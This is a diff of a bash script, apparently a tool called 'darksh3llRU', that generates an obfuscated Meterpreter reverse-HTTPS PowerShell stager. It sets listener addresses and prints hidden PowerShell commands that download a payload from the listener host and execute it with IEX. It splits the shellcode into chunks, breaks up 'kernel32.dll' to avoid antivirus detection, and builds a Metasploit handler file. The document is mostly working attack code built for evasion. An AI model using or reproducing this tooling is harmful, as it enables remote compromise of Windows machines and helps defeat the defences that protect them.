@@ -1,11 +1,11 @@
 #!/bin/bash
 # shellcode replacement stuff
 # meterpreter PSH-NET payload
-# darksh3llRU v0.8
+# darksh3llRU v0.9
 
 # payload options for staged msfvenom -p windows/x64/meterpreter/reverse_https --list-options
 payload="windows/x64/meterpreter/reverse_https"
-ListenerIP=192.168.88.19
+ListenerIP=10.0.8.4
 ListenerPort=8443
 ListenerURI="/logout"
 ProxyType=HTTP
@@ -14,7 +14,7 @@ ProxyPort=""
 ProxyUser=""
 ProxyPass=""
 UserAgent="'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko'"
-DownloadURL="http://192.168.88.19:8080"
+DownloadURL="http://10.0.8.4:8080"
 
 # payload options one liner
 payload_options="LHOST=$ListenerIP LPORT=$ListenerPort LURI=$ListenerURI HttpProxyType=$ProxyType HttpProxyHost=$ProxyHost HttpProxyPort=$ProxyPort HttpProxyUser=$ProxyUser HttpProxyPass=$ProxyPass HttpUserAgent=$UserAgent"
@@ -27,7 +27,7 @@ $raw_payload
 
 # raw payload usage
 printf "Raw psh-net usage example:\n"
-printf "powershell.exe -Window Hidden -Nop -Exec Bypass -C \"\$nwc=(New-Object Net.WebClient);\$nwc.Proxy=[Net.WebRequest]::GetSystemWebProxy();\$nwc.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;IWR('$DownloadURL/raw_pshnet_revhttps.ps1') -UserAgent $UserAgent|IEX\"\n"
+printf "powershell.exe -Window Hidden -Nop -Exec Bypass -C \"[System.Net.WebRequest]::DefaultWebProxy=[System.Net.WebRequest]::GetSystemWebProxy();[System.Net.WebRequest]::DefaultWebProxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials;IWR('$DownloadURL/raw_pshnet_revhttps.ps1') -UserAgent $UserAgent|IEX\"\n"
 
 # extract base64 encoded string, decode, convert to binary format for the future update
 # n00b dirty way: cat raw_pshnet_revhttps.ps1 | grep FromBase64String | grep -o '".*"' | sed 's/"//g'
@@ -55,10 +55,10 @@ printf "\nNew shellcode:\n$eleet_shellcode"
 #cp raw_pshnet_revhttps.ps1 eleet_pshnet_revhttps.ps1
 #sed -i "s,$raw_shellcode,$eleet_shellcode,g" eleet_pshnet_revhttps.ps1
 #printf "\nShellcode replacement done! eleet psh-net usage example:\n"
-#printf "powershell.exe -Window Hidden -Nop -Exec Bypass -C \"\$nwc=(New-Object Net.WebClient);\$nwc.Proxy=[Net.WebRequest]::GetSystemWebProxy();\$nwc.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;IWR('$DownloadURL/eleet_pshnet_revhttps.ps1') -UserAgent $UserAgent|IEX\"\n"
+#printf "powershell.exe -Window Hidden -Nop -Exec Bypass -C \"[System.Net.WebRequest]::DefaultWebProxy=[System.Net.WebRequest]::GetSystemWebProxy();[System.Net.WebRequest]::DefaultWebProxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials;IWR('$DownloadURL/eleet_pshnet_revhttps.ps1') -UserAgent $UserAgent|IEX\"\n"
 
 # real eleet stager creations
-chunk_size=200
+chunk_size=77
 printf "\nSplitting shellcode in chunks with size $chunksize"
 cp raw_pshnet_revhttps.ps1 final_pshnet_revhttps.ps1
 # determine shellcode size, split by chunk_size in the cycle and put to the array
@@ -118,10 +118,11 @@ do
 done
 
 # do kernel32.dll things to avoid detection
+#ISB.Downloader!gen245
 sed -i 's,kernel32.dll,ke"+"rn"+"e"+"l"+"32."+"d"+"l"+"l,g' final_pshnet_revhttps.ps1
 
 printf "Final psh-net usage example:\n"
-printf "powershell.exe -Window Hidden -Nop -Exec Bypass -C \"\$nwc=(New-Object Net.WebClient);\$nwc.Proxy=[Net.WebRequest]::GetSystemWebProxy();\$nwc.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;IWR('$DownloadURL/final_pshnet_revhttps.ps1') -UserAgent $UserAgent|IEX\"\n"
+printf "powershell.exe -Window Hidden -Nop -Exec Bypass -C \"[System.Net.WebRequest]::DefaultWebProxy=[System.Net.WebRequest]::GetSystemWebProxy();[System.Net.WebRequest]::DefaultWebProxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials;IWR('$DownloadURL/final_pshnet_revhttps.ps1') -UserAgent $UserAgent|IEX\"\n"
 
 # createing multu handler listener file
 printf "Creating multi handler script file...\n"
@@ -138,7 +139,3 @@ printf "set HttpProxyPass $ProxyPass\n" >> multihandler.rc
 printf "set HttpUserAgent $UserAgent\n" >> multihandler.rc
 printf "exploit -j -z\n" >> multihandler.rc
 printf "Run listener: msfconsole -r multihandler.rc\n"
-
-
-
-
